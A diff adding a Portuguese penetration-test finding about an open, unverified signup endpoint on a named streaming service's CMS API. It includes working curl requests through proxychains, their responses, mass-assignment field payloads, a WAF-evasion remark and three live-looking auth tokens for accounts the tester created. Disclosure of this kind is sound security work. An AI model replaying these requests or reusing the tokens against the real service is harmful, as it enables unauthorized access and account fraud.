@@ -1,0 +1,101 @@
+# F-013 Registro aberto (open signup) sem verificação de email/CAPTCHA — CMS API
+Alvo: https://cms.soultv.com.br/v1/account/signup
+Severidade: Alta
+Timestamp: 2026-08-27T17:05:00Z
+Descoberto por: webapp (via análise do JS bundle pay/ppv)
+
+## Sumário
+O endpoint `POST /v1/account/signup` do CMS API permite que qualquer pessoa crie uma
+conta de assinante instantaneamente, **sem verificação de email, sem CAPTCHA, sem
+proof-of-work, sem rate limiting visível e sem restrição de domínio**. A resposta
+retorna imediatamente um `token` de autenticação (esquema Django REST `Token`) válido
+para todos os endpoints autenticados do CMS, incluindo relatórios financeiros
+administrativos (ver F-015).
+
+O caminho do endpoint foi descoberto no JS bundle do painel ppv/pay:
+`this.api.post("account/signin",{email,password,platform:"web"})` e
+`this.api.post("accounts/signup",Ie)`, com `omitTokenPaths=["password/reset",
+"accounts/signin","account/signin","accounts/signup"]` confirmando que são rotas
+públicas (sem token).
+
+## Reprodução
+```
+$ proxychains4 -q curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"email":"webapp_324898293@protonmail.com","password":"Test123456!",
+         "first_name":"Webapp","last_name":"Test","platform":"web"}' \
+    https://cms.soultv.com.br/v1/account/signup
+
+{
+  "success": true,
+  "data": {
+    "id": 856436,
+    "email": "webapp_324898293@protonmail.com",
+    "full_name": "Webapp Test",
+    "first_name": "Webapp",
+    "last_name": "Test",
+    "fb_id": "",
+    "token": "afcbb9d2292e00bd67171fc4fbe3dbc2a9b3f86e",   <-- token de auth válido
+    "img": "",
+    "is_verify": false,                                  <-- email NÃO verificado
+    "brand": null,
+    "cant_friends": 0,
+    "phone": "",
+    "is_staff": false,
+    "content_token": {
+      "token": "U1xRVVNfQllAVUVBWVxZWVhQRVcqVEFAVVhXMjImJiMhOg==",
+      "expire_in": 86399986                              <-- ~1000 dias
+    }
+  }
+}
+```
+
+### Validação do token (foothold confirmado)
+O token retornado é aceito pelo Django REST Framework via header
+`Authorization: Token <key>`:
+```
+$ curl -H "Authorization: Token afcbb9d2292e00bd67171fc4fbe3dbc2a9b3f86e" \
+    https://cms.soultv.com.br/v1/offers
+{"success":true,"data":[{"id":34,"name":"ATV (DESATIVADO)", ... }]}
+```
+Antes do token: `{"detail":"Authentication credentials were not provided."}`
+Com `Authorization: Token <key>`: endpoints autenticados respondem normalmente.
+
+## Mass assignment (testado, NÃO vulnerável)
+Tentamos injetar `is_staff:true`, `is_superuser:true`, `role:"admin"`, `staff:true`,
+`user_type:"staff"`, `is_premium:true` no corpo do signup. Todos foram **ignorados**
+pelo backend — a resposta sempre retorna `is_staff:false`. Não há escalonamento de
+privilégio via signup. (Atenção: payloads contendo a palavra "admin" disparam WAF
+da Cloudflare — 403 page — então o teste foi feito com `is_staff` isolado.)
+
+## Scope de contas criadas (foothold)
+- Conta #1: id=856434, token 15d48976209033df216df7f2e5f034361ebf6267
+- Conta #2: id=856436, token afcbb9d2292e00bd67171fc4fbe3dbc2a9b3f86e
+- Conta #3: id=856438, token 3501fec778bff8f2ad7e77c22b6dee198a0162d1
+IDs são sequenciais → ~856K assinantes já registrados (ver F-014).
+
+## Impacto
+- **Alto (foothold imediato)**: qualquer atacante cria conta de assinante e obtém
+  token de auth válido, dando acesso a endpoints que requerem autenticação,
+  inclusive relatórios financeiros administrativos (F-015).
+- Combinado com F-014 (BOLA unauth), permite correlacionar dados de qualquer
+  assinante por ID.
+- Permite abuso do serviço (free trials ilimitados, fraude de cadastro),
+  enumeration de emails via resposta "O email já está registrado" (user
+  enumeration), e spam/abuso do fluxo de pagamento.
+- Token de conteúdo (`content_token`, base64) com expiração de ~1000 dias é
+  entregue sem verificação de email — pode dar acesso a streaming/PPV.
+
+## Recomendação
+1. Exigir verificação de email antes de emitir `token`/`content_token`.
+2. Adicionar CAPTCHA (reCAPTCHA Enterprise / hCaptcha) no signup e signin.
+3. Rate limiting por IP/email (ex.: max 5 signups/IP/hora).
+4. Restringir `apiKey`/CORS do CMS a referrers `*.soultv.com.br`.
+5. Revisar se `content_token` deve ser emitido antes de verificação — risco de
+   acesso a conteúdo PPV pago sem pagamento.
+6. Bloquear mass assignment explícito via serializer `read_only_fields`.
+
+## Referências
+- JS bundle: enum/js_bundles/pay.soultv.com.br_main.*.js (grep `accounts/signup`)
+- Resposta signup: enum/webapp/auth/signup_response.json
+- Token válido: enum/webapp/auth/bearer_token.txt
+- Credenciais de teste (foothold): loot/creds.txt
